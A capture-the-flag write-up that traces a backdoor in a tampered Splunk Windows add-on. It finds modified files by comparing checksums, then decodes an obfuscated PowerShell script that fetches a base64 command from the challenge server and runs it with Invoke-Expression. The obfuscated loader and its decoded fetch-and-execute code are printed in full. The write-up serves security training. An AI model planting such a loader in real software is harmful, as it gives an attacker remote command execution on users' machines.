# Backdoored Splunk 2

You've probably seen Splunk being used for good, but have you seen it used for evil?

**NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag.**

**Attachments: Splunk_TA_windows.zip**

---

I started by downloading the zip and going through the files a bit. Immediately, I found a manifest file that contained a list of checksums:

![list of checksums in splunkbase.manifest](https://github.com/mythemeria/ctf-writeups/blob/main/images/11112024-115938.png?raw=true)

The whole point of checksums is to have a way to tell if a file has been modified, so I figured this would be an easy way to work out where the modified files are. Unless, the checksums were modified, of course.

So I wrote a quick python script to calculate the checksums of all the files and compare them to the ones in the manifest:

```python
import hashlib

def compute_sha256(filepath):
  sha256_hash = hashlib.sha256()
  with open(filepath, "rb") as f:
    for byte_block in iter(lambda: f.read(4096), b""):
      sha256_hash.update(byte_block)
  return sha256_hash.hexdigest()

for tup in files:
  path = f'splunk/{tup["path"]}'
  expected_digest = tup['hash']
  try:
    computed_digest = compute_sha256(path)
    if computed_digest != expected_digest:
      print(f"File: {path}")
      print("Checksum does not match.\n")
  except FileNotFoundError:
    print(f"File not found: {path}\n")
  except Exception as e:
    print(f"Error processing file {path}: {e}\n")
```

Admittedly this could be better and I could have just skipped printing the ones that didn't match, but it did what it needed to do at this point so I didn't feel any need to continue making it nicer.

The following files did not match:

```
File: splunk/bin/powershell/dns-health.ps1
Checksum does not match.

File: splunk/bin/runpowershell.cmd
Checksum does not match.

File: splunk/default/inputs.conf
Checksum does not match.
```

Taking a look in `splunk/bin/powershell/dns-health.ps1` and uh...

![suspicious powershell](https://github.com/mythemeria/ctf-writeups/blob/main/images/11112024-120410.png?raw=true)

```powershell
[STRinG]::JoIN('',[chAr[]](36 , 79 ,83 , 86, 69 ,82 ,32, 61,32,39 , 105, 101, 120 , 32 , 40 ,91 ,83 , 121 , 115 , 116,101 , 109, 46,84 ,101 ,120 , 116 ,46,69 ,110 ,99, 111 , 100, 105 ,110 ,103 ,93, 58 ,58 ,85, 84,70 , 56,46,71 ,101 ,116,83,116, 114 , 105 , 110, 103 ,40 , 91 , 83 ,121 , 115 ,116, 101, 109 , 46 ,67 ,111, 110,118 , 101, 114 ,116 , 93, 58 ,58, 70,114 ,111, 109 ,66,97 , 115, 101,54, 52 , 83 , 116 , 114 ,105 , 110,103,40 ,34,73,121 , 65 , 107,85, 69 , 57 , 83,86 ,67 ,66 ,105,90 ,87, 120, 118 , 100,121, 66,112 ,99,121 , 66 ,107 ,101, 87 , 53 , 104,98 ,87 , 108 , 106, 73 , 72 , 82 , 118 ,73, 72,82 , 111, 90 , 83, 66, 121 , 100 , 87, 53 , 117 ,97 , 87 , 53 , 110, 73,72 ,78, 108 ,99, 110 , 90 , 112, 89,50 ,85 , 103, 98 ,50 ,89,103 , 100,71,104 ,108,73, 71 ,66 , 84, 100, 71, 70 , 121 , 100 ,71 , 65, 103, 89, 110,86,48, 100,71 , 57, 117 , 68, 81, 112,65 ,75 , 67,82,111 ,100 ,71 ,49 , 115 ,73 , 68,48,103, 75 ,69, 108,117,100, 109 ,57,114 , 90 , 83 , 49,88, 90 ,87,74,83,90, 88, 70, 49, 90,88, 78 ,48, 73,71 ,104 ,48 ,100,72 , 65 , 54 ,76, 121, 57,106 , 97,71, 70,115,98 ,71, 86 ,117 , 90, 50,85 ,117,89 , 51 ,82,109,76 ,109, 100, 104,98 ,87 ,86, 122 ,79 , 105, 82 ,81 ,84 , 49,74, 85 , 73,67,49 ,73 , 90 ,87 ,70,107 , 90, 88 , 74,122 ,73,69, 66 ,55 ,81 ,88 , 86 ,48 ,97 ,71 ,57 , 121 ,97,88, 112,104, 100 ,71 ,108, 118,98,106 , 48 ,111,73 ,107, 74, 104,99,50 ,108,106,73,70, 108 , 116, 82,109,112 ,104, 77 ,108, 74 ,50 ,89,106 ,78 , 74 ,78,109 ,82, 72 , 97,72, 66, 106 ,77 , 84 ,108 ,119, 89 , 122,69, 53,77 , 71 , 70 , 72 ,86, 109,90, 104 , 83 , 70,73,119 ,89 , 48, 89 , 53 ,101 ,108, 112, 89 , 83 , 106,74 , 97, 87 ,69,112 , 109 ,89 ,122, 74,87 ,97, 109,78, 116, 86,106 , 65, 105,75, 88 , 48, 103 , 76,86 ,86 ,122, 90 , 85,74 , 104 ,99, 50,108, 106 ,85, 71, 70 ,121,99,50 , 108 , 117 , 90,121 , 107 ,117, 81,50 ,57,117, 100, 71 , 86 , 117, 100 , 65, 48 , 75,97 , 87,89 ,103, 75 ,67, 82 , 111,100 ,71 , 49, 115 ,73 ,67,49 ,116 , 89 , 88, 82,106 ,97 , 67 , 65,110, 80, 67 , 69 , 116 , 76,83 , 103, 117 , 75 ,106 , 56 ,112 ,76 , 83,48,43,74,121 , 107 ,103 , 101,119 ,48 ,75, 73,67 , 65 ,103,73 , 67 , 82, 50,89 ,87, 120,49 ,90 ,83, 65 , 57 , 73, 67, 82, 116 ,89, 88 , 82,106 ,97 ,71, 86,122, 87, 122,70,100 , 68, 81 ,111,103 , 73 ,67,65 , 103 , 74 , 71, 78 ,118, 98 ,87 ,49, 104 ,98 ,109 ,81, 103,80 , 83 , 66, 98 ,85 , 51 , 108, 122 , 100 ,71,86, 116, 76,108 ,82, 108 , 101,72,81,117 ,82,87 ,53 ,106 ,98 , 50, 82 , 112 ,98,109 ,100,100 , 79 , 106 , 112 ,86 ,86 , 69 , 89,52 ,76,107 , 100,108, 100 , 70, 78,48 ,99,109 , 108,117 , 90 , 121, 104 , 98 , 85, 51, 108 ,122, 100, 71, 86, 116 , 76 , 107, 78 ,118 ,98, 110,90, 108 , 99, 110,82,100, 79,106,112, 71,99,109, 57, 116 , 81 , 109 , 70 , 122 , 90 , 84,89 , 48 , 85, 51 , 82,121 , 97 ,87,53, 110,75,67,82 ,50,89 , 87 , 120 , 49 ,90 , 83 , 107 ,112 ,68, 81,111, 103 , 73, 67, 65 ,103 ,83 ,87, 53 ,50 , 98 , 50, 116 , 108, 76,85,86 , 52 ,99 ,72, 74 ,108, 99,51 ,78, 112 ,98, 50 , 52 , 103, 74, 71, 78,118, 98, 87 , 49 ,104 ,98, 109 ,81 , 78 ,67 ,110,48 , 112 , 34,41, 41 , 41,39 )) | &( $PsHomE[21]+$PsHoMe[30]+'X')
```

That's not suspicious at all!

This is pretty obviously an obfuscated string, so deobsfucating it, we get:

```powershell
$OSVER = 'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IyAkUE9SVCBiZWxvdyBpcyBkeW5hbWljIHRvIHRoZSBydW5uaW5nIHNlcnZpY2Ugb2YgdGhlIGBTdGFydGAgYnV0dG9uDQpAKCRodG1sID0gKEludm9rZS1XZWJSZXF1ZXN0IGh0dHA6Ly9jaGFsbGVuZ2UuY3RmLmdhbWVzOiRQT1JUIC1IZWFkZXJzIEB7QXV0aG9yaXphdGlvbj0oIkJhc2ljIFltRmphMlJ2YjNJNmRHaHBjMTlwYzE5MGFHVmZhSFIwY0Y5elpYSjJaWEpmYzJWamNtVjAiKX0gLVVzZUJhc2ljUGFyc2luZykuQ29udGVudA0KaWYgKCRodG1sIC1tYXRjaCAnPCEtLSguKj8pLS0+Jykgew0KICAgICR2YWx1ZSA9ICRtYXRjaGVzWzFdDQogICAgJGNvbW1hbmQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCR2YWx1ZSkpDQogICAgSW52b2tlLUV4cHJlc3Npb24gJGNvbW1hbmQNCn0p")))' | &( $PsHomE[21]+$PsHoMe[30]+'X')
```

Deobsfucating the next layer:

```powershell
# $PORT below is dynamic to the running service of the `Start` button
@($html = (Invoke-WebRequest http://challenge.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
  $value = $matches[1]
  $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
  Invoke-Expression $command
})
```

It looks like this authorization header will let us access the backdoor!

We do a curl request with this authorisation header:

`curl -H 'Authorization: Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0' http://challenge.ctf.games:30343`

which gets `<!-- ZWNobyBmbGFne2UxNWE2YzAxNjhlZTRkZTczODFmNTAyNDM5MDE0MDMyfQ== -->` which seems to be just executed

b64 decoded: `echo flag{e15a6c0168ee4de7381f502439014032}`

---

Notes:

* The other two files that showed up as modified seemed to be involved in enabling the backdoor to work, but weren't too interesting or useful on their own.
